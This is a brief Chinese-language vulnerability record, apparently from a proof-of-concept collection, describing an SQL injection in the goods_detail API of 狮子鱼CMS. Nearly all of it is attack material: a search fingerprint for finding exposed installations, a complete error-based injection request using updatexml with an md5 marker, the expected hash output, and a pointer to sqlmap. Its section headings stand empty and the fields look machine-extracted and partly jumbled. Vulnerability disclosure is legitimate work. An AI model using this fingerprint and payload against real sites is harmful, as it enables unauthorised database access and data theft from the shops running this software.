# 狮子鱼CMSgoods_detail存在SQL注入漏洞

- **系统**：狮子鱼　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="狮子鱼CMS"`
- **请求**：`GET /index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1) HTTP/2`
- **关键头**：`Cookie: PHPSESSID=ph2jp51vnnubr9nqn6hu63485j`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```
c4ca4238a0b923820dcc509a6f75849
sqlmap
/index.php?s=api/goods_detail&goods_id=1
```

**其他**
- 狮子鱼CMS goods\_detail存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 狮子鱼CMS